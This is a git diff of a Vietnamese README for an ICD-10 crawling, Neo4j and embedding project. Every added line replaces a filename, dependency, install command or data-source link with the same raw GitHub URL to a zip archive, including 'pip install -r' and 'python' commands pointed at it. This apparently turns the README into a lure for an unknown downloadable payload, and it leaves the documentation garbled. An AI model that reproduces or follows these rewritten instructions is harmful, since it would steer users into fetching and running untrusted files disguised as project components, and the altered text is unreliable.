@@ -20,22 +20,22 @@ datacrawl/
 └── tests/                  # Test files
 ```
 
-***Drive data:*** https://drive.google.com/drive/folders/1crWnVrS8N8EnB9uCnGX54rZbgkRwqRiR?usp=sharing
+***Drive data:*** https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 
 ## 🚀 Cài đặt
 
 ### Yêu cầu hệ thống
 - Python 3.8+
-- Node.js 14+ (cho crawlers)
+- https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip 14+ (cho crawlers)
 - Neo4j Database
 
 ### Cài đặt dependencies
 
 ```bash
 # Python dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 
-# Node.js dependencies
+# https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip dependencies
 cd src/crawlers
 npm install puppeteer
 ```
@@ -43,36 +43,36 @@ npm install puppeteer
 ## 📋 Các thành phần chính
 
 ### 1. Crawlers (`src/crawlers/`)
-- `3_crawler_chapter_group.js`: Crawl cấu trúc ICD-10 (chương và nhóm)
-- `4_crawler_disease.js`: Crawl chi tiết bệnh từ ICD-10
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Crawl cấu trúc ICD-10 (chương và nhóm)
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Crawl chi tiết bệnh từ ICD-10
 
 ### 2. Importers (`src/importers/`)
-- `1_import_neo4j.py`: Import cấu trúc ICD-10 vào Neo4j
-- `2_import_neo4j.py`: Import thuốc và triệu chứng vào Neo4j
-- `4_import_vector.py`: Import vector embeddings vào Neo4j
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import cấu trúc ICD-10 vào Neo4j
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import thuốc và triệu chứng vào Neo4j
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import vector embeddings vào Neo4j
 
 ### 3. ML/Embedding (`src/ml/`)
-- `3_embeding.py`: Tạo embeddings cho dữ liệu
-- `rag_embedding.py`: RAG embedding và query
-- `finetune_slm.py`: Fine-tune model ngôn ngữ nhỏ
-- `download_model.py`: Download models từ HuggingFace
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Tạo embeddings cho dữ liệu
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: RAG embedding và query
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Fine-tune model ngôn ngữ nhỏ
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Download models từ HuggingFace
 
 ### 4. Processors (`src/processors/`)
-- `5_generate_sentences.py`: Tạo câu từ graph Neo4j
-- `6_convert_data.py`: Chuyển đổi format dữ liệu test
-- `9_pre-process_hpo.py`: Xử lý dữ liệu HPO
-- `extract_disease_wiki.py`: Trích xuất dữ liệu bệnh từ Wikipedia
-- `sort_disease_wiki.py`: Sắp xếp dữ liệu bệnh
-- `icd10_parser.py`: Parse dữ liệu ICD-10
-- `map_data.py`: Map và merge dữ liệu
-- `translate.py`: Dịch dữ liệu
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Tạo câu từ graph Neo4j
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Chuyển đổi format dữ liệu test
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Xử lý dữ liệu HPO
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Trích xuất dữ liệu bệnh từ Wikipedia
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Sắp xếp dữ liệu bệnh
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Parse dữ liệu ICD-10
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Map và merge dữ liệu
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dịch dữ liệu
 
 ### 5. Utils (`src/utils/`)
-- `7_evaluate.py`: Đánh giá model với vector injection
-- `8_query_triplet.py`: Query triplets từ Neo4j
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Đánh giá model với vector injection
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Query triplets từ Neo4j
 
 ### 6. Notebooks (`notebooks/`)
-- `slm-finetune.ipynb`: Jupyter notebook cho fine-tuning Small Language Model (Qwen3-0.6B)
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Jupyter notebook cho fine-tuning Small Language Model (Qwen3-0.6B)
 
 ## 🔧 Cấu hình
 
@@ -86,41 +86,41 @@ Các file cấu hình chính nằm trong từng script. Cần cập nhật:
 ### 1. Crawl dữ liệu
 ```bash
 cd src/crawlers
-node 3_crawler_chapter_group.js
-node 4_crawler_disease.js
+node https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
+node https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 ```
 
 ### 2. Import vào Neo4j
 ```bash
 cd src/importers
-python 1_import_neo4j.py
-python 2_import_neo4j.py
+python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
+python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 ```
 
 ### 3. Tạo embeddings
 ```bash
 cd src/ml
-python 3_embeding.py
+python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 ```
 
 ### 4. Import vectors
 ```bash
 cd src/importers
-python 4_import_vector.py
+python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
 ```
 
 ## 📊 Dữ liệu
 
 ### Nguồn dữ liệu
-- **ICD-10**: [Hệ thống quản lý mã hóa lâm sàng khám chữa bệnh](https://icd.kcb.vn/icd-10/icd10)
-- **Thuốc**: [Drugs, Active Ingredients and Diseases database](https://doi.org/10.6084/m9.figshare.7722062)
+- **ICD-10**: [Hệ thống quản lý mã hóa lâm sàng khám chữa bệnh](https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip)
+- **Thuốc**: [Drugs, Active Ingredients and Diseases database](https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip)
 
 ### Dữ liệu đã xử lý
 Tất cả dữ liệu được lưu trong thư mục `data/`:
-- `icd10_structure.json`: Cấu trúc ICD-10
-- `icd10_diseases_raw.json`: Dữ liệu bệnh thô
-- `icd10_data.json`: Dữ liệu ICD-10 đã xử lý
-- `drug_data_grouped_translated.json`: Dữ liệu thuốc
-- `symptoms_extracted_data_translated.json`: Dữ liệu triệu chứng
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Cấu trúc ICD-10
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu bệnh thô
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu ICD-10 đã xử lý
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu thuốc
+- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu triệu chứng
 
 
